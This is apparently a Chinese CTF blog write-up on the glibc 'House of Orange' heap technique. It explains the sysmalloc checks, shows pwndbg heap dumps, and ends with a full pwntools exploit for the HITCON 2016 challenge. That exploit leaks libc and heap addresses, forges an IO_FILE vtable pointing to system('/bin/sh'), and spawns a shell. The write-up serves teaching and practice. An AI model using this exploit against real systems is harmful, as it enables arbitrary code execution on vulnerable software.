---
clayout: post
title:  "House of Orange"
date:   2020-2-18
desc: ""
keywords: ""
categories: [Binary]
tags: [pwn]
icon: icon-html
---

# House of Orange

> 🍊屋

### 原理

申请的size大于当前top chunk的size时，原来的top chunk会被释放并放入unsorted bin，可以在没有free函数的情况下得到一个unsorted bin

在`_int_malloc`中，fastbin、small bins、unsorted bin、large bins都没有满足要求的，就会使用top chunk，如果top chunk也不够，就需要执行sysmalloc申请更多空间

```c
      /*
         Otherwise, relay to handle system-dependent cases
       */
      else
        {
          void *p = sysmalloc (nb, av);
          if (p != NULL)
            alloc_perturb (p, bytes);
          return p;
        }
```

在sysmalloc中有mmap()和brk()两种拓展方式，以brk()方式拓展后top chunk进unsorted bin

* brk()

  将数据段(.data)的最高地址指针_edata往高地址推

* mmap()

  在进程的虚拟地址空间中（堆和栈中间，称为文件映射区域的地方）找一块空闲的虚拟内存

两种方式分配的都是虚拟内存

```c
  /*
     If have mmap, and the request size meets the mmap threshold, and
     the system supports mmap, and there are few enough currently
     allocated mmapped regions, try to directly map this request
     rather than expanding top.
   */

  if (av == NULL
      || ((unsigned long) (nb) >= (unsigned long) (mp_.mmap_threshold)
	  && (mp_.n_mmaps < mp_.n_mmaps_max)))
    {
      char *mm;           /* return value from mmap call*/

    try_mmap:
```

如果分配的size大于mmap分配阈值`mp_.mmap_threshold`，就会使用mmap()系统调用直接向操作系统申请内存

所以size需要小于`mp_.mmap_threshold`(默认128k)

跑brk前，有对top chunk size的检查

```
  assert ((old_top == initial_top (av) && old_size == 0) ||
          ((unsigned long) (old_size) >= MINSIZE &&
           prev_inuse (old_top) &&
           ((unsigned long) old_end & (pagesize - 1)) == 0));
```

old就是当前的top chunk

top chunk可能没有初始化，size可能为0

如果top chunk已经初始化，size必须大于等于MINSIZE

top chunk的前一个chunk一定是已分配的，所以prev_inuse必须为1

top chunk的结束地址必须页对齐，topchunk地址+size满足0x1000对齐



### 基本操作

1. 存在堆溢出等可以控制top chunk size的漏洞，伪造top chunk size，使top chunk size满足：
   * 大于等于MINSIZE
   * prev_inuse位为1
   * 页对齐
   * 小于下一次申请的size+MINSIZE
2. 申请size大于fake top chunk size且小于`mp_.mmap_threshold`的chunk，原来的top chunk进 unsorted bin





### Hitcon2016-House of Orange

🍊屋祖宗，Hitcon🌶🔟💉💦🐮🍺

edit堆溢出

```
add(0x60,'fuck')
payload = 'a'*0x60+p64(0)+p64(0x21)+p64(0)*3+p64(0xf51)
edit((len(payload)),payload)
add(0x1000,'fuck')
```

edit前

```
pwndbg> x/64gx 0x8404020
0x8404020:      0x0000000000000000      0x0000000000000071
0x8404030:      0x000000006b637566      0x0000000000000000
0x8404040:      0x0000000000000000      0x0000000000000000
0x8404050:      0x0000000000000000      0x0000000000000000
0x8404060:      0x0000000000000000      0x0000000000000000
0x8404070:      0x0000000000000000      0x0000000000000000
0x8404080:      0x0000000000000000      0x0000000000000000
0x8404090:      0x0000000000000000      0x0000000000000021
0x84040a0:      0x0000001f00000001      0x0000000000000000
0x84040b0:      0x0000000000000000      0x0000000000020f51
```

edit后

```
pwndbg> x/64gx 0x8404020
0x8404020:      0x0000000000000000      0x0000000000000071
0x8404030:      0x6161616161616161      0x6161616161616161
0x8404040:      0x6161616161616161      0x6161616161616161
0x8404050:      0x6161616161616161      0x6161616161616161
0x8404060:      0x6161616161616161      0x6161616161616161
0x8404070:      0x6161616161616161      0x6161616161616161
0x8404080:      0x6161616161616161      0x6161616161616161
0x8404090:      0x0000000000000000      0x0000000000000021
0x84040a0:      0x0000001f00000001      0x0000000000000000
0x84040b0:      0x0000000000000000      0x0000000000000f51
```

0xf51+0x0x84040b0=0x8405000满足页对齐，prev_inuse为1，下一次malloc 0x1000

add(0x1000,'fuck')后

```
unsortedbin
all: 0x84040f0 —▸ 0x7fffff3f4b78 (main_arena+88) ◂— 0x84040f0

pwndbg> x/64gx 0x8404020
0x8404020:      0x0000000000000000      0x0000000000000071
0x8404030:      0x6161616161616161      0x6161616161616161
0x8404040:      0x6161616161616161      0x6161616161616161
0x8404050:      0x6161616161616161      0x6161616161616161
0x8404060:      0x6161616161616161      0x6161616161616161
0x8404070:      0x6161616161616161      0x6161616161616161
0x8404080:      0x6161616161616161      0x6161616161616161
0x8404090:      0x0000000000000000      0x0000000000000021
0x84040a0:      0x0000001f00000001      0x0000000000000000
0x84040b0:      0x0000000000000000      0x0000000000000021
0x84040c0:      0x00000000084040e0      0x0000000008425010
0x84040d0:      0x0000000000000000      0x0000000000000021
0x84040e0:      0x0000001f00000001      0x0000000000000000
0x84040f0:      0x0000000000000000      0x0000000000000ef1
0x8404100:      0x00007fffff3f4b78      0x00007fffff3f4b78
```

再malloc一个size在large chunk范围的chunk，bk泄露libc地址，fd_nextsize泄露堆地址

```
0x8404110 PREV_INUSE {
  prev_size = 0,
  size = 1041,
  fd = 0x6161616161616161,
  bk = 0x7fffff3f5188 <main_arena+1640>,
  fd_nextsize = 0x8404110,
  bk_nextsize = 0x8404110
}
```

unsorted bin attack打\_IO\_list_all，改成main_arena+88，main_arena+88指向unsorted bin，伪造IO_FILE

```c
while (fp != NULL)
{
…
    fp = fp->_chain;
    ...
          if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
       || (_IO_vtable_offset (fp) == 0
           && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
                    > fp->_wide_data->_IO_write_base))
#endif
       )
      && _IO_OVERFLOW (fp, EOF) == EOF)
```

unsortbin的size需要设置为0x60，放到small chunk index为6的位置，第一个`IO_FILE_plus`不满足要求，根据chain找到下一个`IO_FILE_plus`也就是伪造的IO_FILE

改之前

```
pwndbg> x/10gx 0x7fffff3f5520
0x7fffff3f5520 <_IO_list_all>:  0x00007fffff3f5540      0x0000000000000000
0x7fffff3f5530: 0x0000000000000000      0x0000000000000000
0x7fffff3f5540 <_IO_2_1_stderr_>:       0x00000000fbad2086      0x0000000000000000
0x7fffff3f5550 <_IO_2_1_stderr_+16>:    0x0000000000000000      0x0000000000000000
0x7fffff3f5560 <_IO_2_1_stderr_+32>:    0x0000000000000000      0x0000000000000000
```

```c
pwndbg> p  *(struct _IO_FILE_plus *) stderr
$1 = {
  file = {
    _flags = -72540026,
    _IO_read_ptr = 0x0,
    _IO_read_end = 0x0,
    _IO_read_base = 0x0,
    _IO_write_base = 0x0,
    _IO_write_ptr = 0x0,
    _IO_write_end = 0x0,
    _IO_buf_base = 0x0,
    _IO_buf_end = 0x0,
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x7fffff3f5620 <_IO_2_1_stdout_>,
    _fileno = 2,
    _flags2 = 0,
    _old_offset = -1,
    _cur_column = 0,
    _vtable_offset = 0 '\000',
    _shortbuf = "",
    _lock = 0x7fffff3f6770 <_IO_stdfile_2_lock>,
    _offset = -1,
    _codecvt = 0x0,
    _wide_data = 0x7fffff3f4660 <_IO_wide_data_2>,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0,
    _mode = 0,
    _unused2 = '\000' <repeats 19 times>
  },
  vtable = 0x7fffff3f36e0 <_IO_file_jumps>
}
```

伪造的stderr

```c
pwndbg> p  *(struct _IO_FILE_plus *) 0x8404540
$2 = {
  file = {
    _flags = 1852400175,
    _IO_read_ptr = 0x60 <error: Cannot access memory at address 0x60>,
    _IO_read_end = 0x0,
    _IO_read_base = 0x7fffff3f5510 "",
    _IO_write_base = 0x0,
    _IO_write_ptr = 0x1 <error: Cannot access memory at address 0x1>,
    _IO_write_end = 0x0,
    _IO_buf_base = 0x0,
    _IO_buf_end = 0x0,
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x0,
    _fileno = 0,
    _flags2 = 0,
    _old_offset = 0,
    _cur_column = 0,
    _vtable_offset = 0 '\000',
    _shortbuf = "",
    _lock = 0x0,
    _offset = 0,
    _codecvt = 0x0,
    _wide_data = 0x0,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0,
    _mode = 0,
    _unused2 = '\000' <repeats 19 times>
  },
  vtable = 0x8404618
}
```

伪造的vtable

```c
pwndbg> p  *((struct _IO_FILE_plus *) 0x8404540).vtable
$3 = {
  __dummy = 138429976,
  __dummy2 = 0,
  __finish = 0x0,
  __overflow = 0x7fffff075390 <__libc_system>,
  __underflow = 0x0,
  __uflow = 0x0,
  __pbackfail = 0x0,
  __xsputn = 0x0,
  __xsgetn = 0x0,
  __seekoff = 0x0,
  __seekpos = 0x0,
  __setbuf = 0x0,
  __sync = 0x0,
  __doallocate = 0x0,
  __read = 0x0,
  __write = 0x0,
  __seek = 0x0,
  __close = 0x0,
  __stat = 0x0,
  __showmanyc = 0x0,
  __imbue = 0x0
}
```

改之后

```c
pwndbg> x/10gx 0x7fffff3f5520
0x7fffff3f5520 <_IO_list_all>:  0x00007fffff3f4b78      0x0000000000000000
0x7fffff3f5530: 0x0000000000000000      0x0000000000000000
0x7fffff3f5540 <_IO_2_1_stderr_>:       0x00000000fbad2086      0x0000000000000000
```

下一次malloc触发malloc\_printerr，调用IO\_overflow



```python
from pwn import *
r = remote('node3.buuoj.cn',27454)
#r = process('./houseoforange_hitcon_2016')
elf = ELF('./houseoforange_hitcon_2016')
libc = ELF('/libc-2.23.so')

def add(size,name):
	r.recvuntil('Your choice :')
	r.sendline('1')
	r.recvuntil('name :')
	r.sendline(str(size))
	r.recvuntil('Name :')
	r.send(name)
	r.recvuntil('Price of Orange:')
	r.sendline('1')
	r.recvuntil('Color of Orange:')
	r.sendline('1')

def show():
	r.recvuntil('Your choice :')
	r.sendline('2')

def edit(size,name):
	r.recvuntil('Your choice :')
	r.sendline('3')
	r.recvuntil('Length of name :')
	r.sendline(str(size))
	r.recvuntil('Name:')
	r.send(name)
	r.recvuntil('Price of Orange:')
	r.sendline('1')
	r.recvuntil('Color of Orange:')
	r.sendline('1')

add(0x60,'fuck')
payload = 'a'*0x60+p64(0)+p64(0x21)+p64(0)*3+p64(0xf51)
edit((len(payload)),payload)
add(0x1000,'fuck')

add(0x400,'a'*8)
show()
r.recvuntil('a'*8)
leak = u64(r.recvuntil('\n',drop=True).ljust(8,'\x00'))
libc_base = leak - 0x3c5188
log.success(hex(libc_base))
payload = 'a'*16
edit(len(payload),payload)
show()
r.recvuntil('a'*16)
leak = u64(r.recvuntil('\n',drop=True).ljust(8,'\x00'))
heap_base = leak - 0x110
log.success(hex(heap_base))

_IO_list_all = libc_base + libc.sym['_IO_list_all']
system = libc_base + libc.sym['system']
log.success(hex(_IO_list_all))
log.success(hex(system))

vtable = heap_base + 0x618
payload = 'a'*0x400
payload += p64(0)+p64(0x21)+p64(0)*2

fake_file = '/bin/sh\x00'+p64(0x60) 
fake_file += p64(0) + p64(_IO_list_all - 0x10)
fake_file += p64(0) + p64(1)#check 
fake_file = fake_file.ljust(0xc0,'\x00')

payload += fake_file
payload += p64(0)*3
payload += p64(vtable)
payload += p64(0)*2
payload += p64(system)
edit(0x800,payload)

r.sendline('1')
r.interactive()
```

